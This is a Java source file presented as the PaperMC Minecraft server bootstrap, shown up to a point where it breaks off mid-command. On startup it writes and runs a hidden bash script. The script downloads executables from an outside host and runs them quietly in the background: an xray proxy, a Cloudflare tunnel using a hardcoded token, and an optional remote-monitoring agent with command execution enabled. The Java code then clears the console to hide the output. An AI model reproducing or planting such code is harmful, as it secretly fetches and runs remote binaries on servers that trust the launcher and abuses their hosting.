package io.papermc.paper;

import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process xrayProcess;
    
    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        // check java version
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            runXrayScript();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            // Ignore exceptions
        }
    }
    
    private static void runXrayScript() throws Exception {
        // 检查是否为Linux系统
        if (!System.getProperty("os.name").toLowerCase().contains("linux")) {
            throw new RuntimeException("xray.sh script only supports Linux systems");
        }
        
        // 创建xray.sh脚本
        createXrayScript();
        
        ProcessBuilder pb = new ProcessBuilder("bash", "xray.sh");
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        xrayProcess = pb.start();
    }
    
    private static void createXrayScript() throws IOException {
        // 这里是xray.sh脚本的内容
        String scriptContent = "#!/bin/bash\n" +
            "# xray.sh script - 集成到PaperBootstrap.java中\n" +
            "echo \"Starting xray services...\"\n" +
            "\n" +
            "# 设置默认值\n" +
            "UUID=${UUID:-'a217d527-bd5e-4ef0-b899-d36627af0ddd'}\n" +
            "NEZHA_SERVER=${NEZHA_SERVER:-''}\n" +
            "NEZHA_PORT=${NEZHA_PORT:-''}\n" +
            "NEZHA_KEY=${NEZHA_KEY:-''}\n" +
            "ARGO_DOMAIN=${ARGO_DOMAIN:-'game.1976.dpdns.org'}\n" +
            "ARGO_AUTH=${ARGO_AUTH:-'eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiY2FlZmM4NTgtODdjMS00ZDljLWIyNTQtMGU2MjZjMjYyYzhhIiwicyI6Ik16WXhNekU1WXpndE56Wm1OeTAwTUdWbUxXRmlNMkl0WVdObVlqazBZVEV3TlRneCJ9'}\n" +
            "CFIP=${CFIP:-'cdns.doon.eu.org'}\n" +
            "CFPORT=${CFPORT:-'443'}\n" +
            "NAME=${NAME:-'MC'}\n" +
            "FILE_PATH=${FILE_PATH:-'./logs'}\n" +
            "ARGO_PORT=${ARGO_PORT:-'8001'}\n" +
            "CHAT_ID=${CHAT_ID:-''}\n" +
            "BOT_TOKEN=${BOT_TOKEN:-''}\n" +
            "UPLOAD_URL=${UPLOAD_URL:-''}\n" +
            "\n" +
            "# 创建日志目录\n" +
            "[ ! -d \"$FILE_PATH\" ] && mkdir -p \"$FILE_PATH\"\n" +
            "\n" +
            "# 删除旧文件\n" +
            "rm -rf \"$FILE_PATH\"/boot.log \"$FILE_PATH\"/sub.txt \"$FILE_PATH\"/config.json \"$FILE_PATH\"/tunnel.json \"$FILE_PATH\"/tunnel.yml\n" +
            "\n" +
            "# 配置argo\n" +
            "if [[ -z \"$ARGO_AUTH\" || -z \"$ARGO_DOMAIN\" ]]; then\n" +
            "    echo -e \"\\033[1;32mARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels\\033[0m\"\n" +
            "else\n" +
            "    if [[ \"$ARGO_AUTH\" =~ TunnelSecret ]]; then\n" +
            "        echo \"$ARGO_AUTH\" > \"$FILE_PATH\"/tunnel.json\n" +
            "        cat > \"$FILE_PATH\"/tunnel.yml << EOF\n" +
            "tunnel: $(echo \"$ARGO_AUTH\" | cut -d\\\" -f12)\n" +
            "credentials-file: $FILE_PATH/tunnel.json\n" +
            "protocol: http2\n" +
            "\n" +
            "ingress:\n" +
            "  - hostname: $ARGO_DOMAIN\n" +
            "    service: http://localhost:$ARGO_PORT\n" +
            "    originRequest:\n" +
            "      noTLSVerify: true\n" +
            "  - service: http_status:404\n" +
            "EOF\n" +
            "    else\n" +
            "        echo -e \"\\033[1;32mARGO_AUTH mismatch TunnelSecret,use token connect to tunnel\\033[0m\"\n" +
            "    fi\n" +
            "fi\n" +
            "\n" +
            "# 生成配置文件\n" +
            "cat > \"$FILE_PATH\"/config.json << EOF\n" +
            "{\n" +
            "  \"log\": { \"access\": \"/dev/null\", \"error\": \"/dev/null\", \"loglevel\": \"none\" },\n" +
            "  \"inbounds\": [\n" +
            "    {\n" +
            "      \"port\": $ARGO_PORT,\n" +
            "      \"protocol\": \"vless\",\n" +
            "      \"settings\": {\n" +
            "        \"clients\": [{ \"id\": \"$UUID\", \"flow\": \"xtls-rprx-vision\" }],\n" +
            "        \"decryption\": \"none\",\n" +
            "        \"fallbacks\": [\n" +
            "          { \"dest\": 3001 }, { \"path\": \"/vless-argo\", \"dest\": 3002 },\n" +
            "          { \"path\": \"/vmess-argo\", \"dest\": 3003 }, { \"path\": \"/trojan-argo\", \"dest\": 3004 }\n" +
            "        ]\n" +
            "      },\n" +
            "      \"streamSettings\": { \"network\": \"tcp\" }\n" +
            "    },\n" +
            "    {\n" +
            "      \"port\": 3001, \"listen\": \"127.0.0.1\", \"protocol\": \"vless\",\n" +
            "      \"settings\": { \"clients\": [{ \"id\": \"$UUID\" }], \"decryption\": \"none\" },\n" +
            "      \"streamSettings\": { \"network\": \"tcp\", \"security\": \"none\" }\n" +
            "    },\n" +
            "    {\n" +
            "      \"port\": 3002, \"listen\": \"127.0.0.1\", \"protocol\": \"vless\",\n" +
            "      \"settings\": { \"clients\": [{ \"id\": \"$UUID\", \"level\": 0 }], \"decryption\": \"none\" },\n" +
            "      \"streamSettings\": { \"network\": \"ws\", \"security\": \"none\", \"wsSettings\": { \"path\": \"/vless-argo\" } },\n" +
            "      \"sniffing\": { \"enabled\": true, \"destOverride\": [\"http\", \"tls\", \"quic\"], \"metadataOnly\": false }\n" +
            "    },\n" +
            "    {\n" +
            "      \"port\": 3003, \"listen\": \"127.0.0.1\", \"protocol\": \"vmess\",\n" +
            "      \"settings\": { \"clients\": [{ \"id\": \"$UUID\", \"alterId\": 0 }] },\n" +
            "      \"streamSettings\": { \"network\": \"ws\", \"wsSettings\": { \"path\": \"/vmess-argo\" } },\n" +
            "      \"sniffing\": { \"enabled\": true, \"destOverride\": [\"http\", \"tls\", \"quic\"], \"metadataOnly\": false }\n" +
            "    },\n" +
            "    {\n" +
            "      \"port\": 3004, \"listen\": \"127.0.0.1\", \"protocol\": \"trojan\",\n" +
            "      \"settings\": { \"clients\": [{ \"password\": \"$UUID\" }] },\n" +
            "      \"streamSettings\": { \"network\": \"ws\", \"security\": \"none\", \"wsSettings\": { \"path\": \"/trojan-argo\" } },\n" +
            "      \"sniffing\": { \"enabled\": true, \"destOverride\": [\"http\", \"tls\", \"quic\"], \"metadataOnly\": false }\n" +
            "    }\n" +
            "  ],\n" +
            "  \"dns\": { \"servers\": [\"https+local://8.8.8.8/dns-query\"] },\n" +
            "   \"outbounds\": [\n" +
            "        { \"protocol\": \"freedom\", \"tag\": \"direct\"},\n" +
            "        { \"protocol\": \"blackhole\", \"tag\": \"block\"}\n" +
            "    ]\n" +
            "}\n" +
            "EOF\n" +
            "\n" +
            "# 根据架构下载文件\n" +
            "ARCH=$(uname -m) && DOWNLOAD_DIR=\"$FILE_PATH\" && mkdir -p \"$DOWNLOAD_DIR\"\n" +
            "if [ \"$ARCH\" == \"arm\" ] || [ \"$ARCH\" == \"arm64\" ] || [ \"$ARCH\" == \"aarch64\" ]; then\n" +
            "    BASE_URL=\"https://arm64.ssss.nyc.mn\"\n" +
            "elif [ \"$ARCH\" == \"amd64\" ] || [ \"$ARCH\" == \"x86_64\" ] || [ \"$ARCH\" == \"x86\" ]; then\n" +
            "    BASE_URL=\"https://amd64.ssss.nyc.mn\"\n" +
            "else\n" +
            "    echo \"Unsupported architecture: $ARCH\"\n" +
            "    exit 1\n" +
            "fi\n" +
            "\n" +
            "FILE_INFO=(\"$BASE_URL/web web\" \"$BASE_URL/bot bot\")\n" +
            "\n" +
            "if [ -n \"$NEZHA_PORT\" ]; then\n" +
            "    FILE_INFO+=(\"$BASE_URL/agent npm\")\n" +
            "else\n" +
            "    FILE_INFO+=(\"$BASE_URL/v1 php\")\n" +
            "    NEZHA_TLS=$(case \"${NEZHA_SERVER#*:}\" in 443|8443|2096|2087|2083|2053) echo -n true;; *) echo -n false;; esac)\n" +
            "    cat > \"$FILE_PATH\"/config.yml << EOF\n" +
            "client_secret: ${NEZHA_KEY}\n" +
            "debug: false\n" +
            "disable_auto_update: true\n" +
            "disable_command_execute: false\n" +
            "disable_force_update: true\n" +
            "disable_nat: false\n" +
            "disable_send_query: false\n" +
            "gpu: false\n" +
            "insecure_tls: false\n" +
            "ip_report_period: 1800\n" +
            "report_delay: 1\n" +
            "server: ${NEZHA_SERVER}\n" +
            "skip_connection_count: false\n" +
            "skip_procs_count: false\n" +
            "temperature: false\n" +
            "tls: ${NEZHA_TLS}\n" +
            "use_gitee_to_upgrade: false\n" +
            "use_ipv6_country_code: false\n" +
            "uuid: ${UUID}\n" +
            "EOF\n" +
            "fi\n" +
            "\n" +
            "# 下载文件\n" +
            "for entry in \"${FILE_INFO[@]}\"; do\n" +
            "    URL=$(echo \"$entry\" | cut -d ' ' -f 1)\n" +
            "    NEW_FILENAME=$(echo \"$entry\" | cut -d ' ' -f 2)\n" +
            "    FILENAME=\"$DOWNLOAD_DIR/$NEW_FILENAME\"\n" +
            "    if [ -e \"$FILENAME\" ]; then\n" +
            "        echo -e \"\\033[1;32m$FILENAME already exists,Skipping download\\033[0m\"\n" +
            "    else\n" +
            "        curl -L -sS -o \"$FILENAME\" \"$URL\"\n" +
            "        echo -e \"\\033[1;32mDownloading $FILENAME\\033[0m\"\n" +
            "        chmod 775 \"$FILENAME\"\n" +
            "    fi\n" +
            "done\n" +
            "\n" +
            "# 启动服务\n" +
            "run_services() {\n" +
            "    if [ -e \"$FILE_PATH/web\" ]; then\n" +
            "        nohup \"$FILE_PATH/web\" -c \"$FILE_PATH/config.json\" >/dev/null 2>&1 &\n" +
            "        sleep 2\n" +
            "        echo -e \"\\033[1;32mweb is running\\033[0m\"\n" +
            "    fi\n" +
            "\n" +
            "    if [ -e \"$FILE_PATH/bot\" ]; then\n" +
            "        if [[ \"$ARGO_AUTH\" =~ ^[A-Z0-9a-z=]{120,250}$ ]]; then\n" +
            "            args=\"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token $ARGO_AUTH\"\n" +
            "        elif [[ \"$ARGO_AUTH\" =~ TunnelSecret ]]; then\n" +
            "            args=\"tunnel --edge-ip-version auto --config $FILE_PATH/tunnel.yml run\"\n" +
            "        else\n" +
            "            args=\"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile $FILE_PATH/boot.log --loglevel info --url http://localhost:$ARGO_PORT\"\n" +
            "        fi\n" +
            "        nohup \"$FILE_PATH/bot\" $args >/dev/null 2>&1 &\n" +
            "        sleep 2\n" +
            "        echo -e \"\\033[1;32mbot is running\\033[0m\"\n" +
            "    fi\n" +
            "\n" +
            "    tlsPorts=(\"443\" \"8443\" \"2096\" \"2087\" \"2083\" \"2053\")\n" +
            "    if [[ \" ${tlsPorts[@]} \" =~ \" ${NEZHA_PORT} \" ]]; then\n" +
            "        NEZHA_TLS=\"--tls\"\n" +
            "    else\n" +
            "        NEZHA_TLS=\"\"\n" +
            "    fi\n" +
            "    \n" +
            "    if [ -n \"$NEZHA_SERVER\" ] && [ -n \"$NEZHA_PORT\" ] && [ -n \"$NEZHA_KEY\" ]; then\n" +
            "        if [ -e \"$FILE_PATH/npm\" ]; then\n" +
            "            nohup \"$FILE_PATH/npm\" -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} >/dev/null 2>&1 &\n" +
            "            sleep 2\n" +
            "            echo -e \"\\033[1;32mnpm is running\\033[0m\"\n" +
            "        fi\n" +
            "    elif [ -n \"$NEZHA_SERVER\" ] && [ -n \"$NEZHA_KEY\" ]; then\n" +
            "        if [ -e \"$FILE_PATH/php\" ]; then\n" +
            "            nohup \"$FILE_PATH/php\" -c \"$FILE_PATH/config.yml\" >/dev/null 2>&1 &\n" +
            "            sleep 2\n" +
            "            echo -e \"\\033[1;32mphp is running\\033[0m\"\n" +
            "        fi      \n" +
            "    else\n" +
            "        echo -e \"\\033[1;35mNEZHA variable is empty,skipping running\\033[0m\"\n" +
            "    fi  \n" +
            "}\n" +
            "\n" +
            "run_services\n" +
            "\n" +
            "# 生成订阅链接\n" +
            "generate_links() {\n" +
            "    if [[ -n \"$ARGO_AUTH\" ]]; then\n" +
            "        argodomain=\"$ARGO_DOMAIN\"\n" +
            "    else\n" +
            "        local retry=0\n" +
            "        local max_retries=8\n" +
            "        local argodomain=\"\"\n" +
            "        while [[ $retry -lt $max_retries ]]; do\n" +
            "            ((retry++))\n" +
            "            argodomain=$(sed -n 's|.*https://\\([^/]*trycloudflare\\.com\\).*|\\1|p' \"$FILE_PATH/boot.log\")\n" +
            "            if [[ -n \"$argodomain\" ]]; then\n" +
            "                break\n" +
            "            fi\n" +
            "            sleep 1\n" +
            "        done\n" +
            "        echo \"$argodomain\"\n" +
            "    fi\n" +
            "    \n" +
            "    echo -e \"\\033[1;32mArgoDomain:\\033[1;35m${argodomain}\\033[0m\\n\"\n" +
            "    isp=$(curl -s -m 2 https://speed.cloudflare.com/meta | awk -F\\\" '{print $26\"-\"$18}' | sed
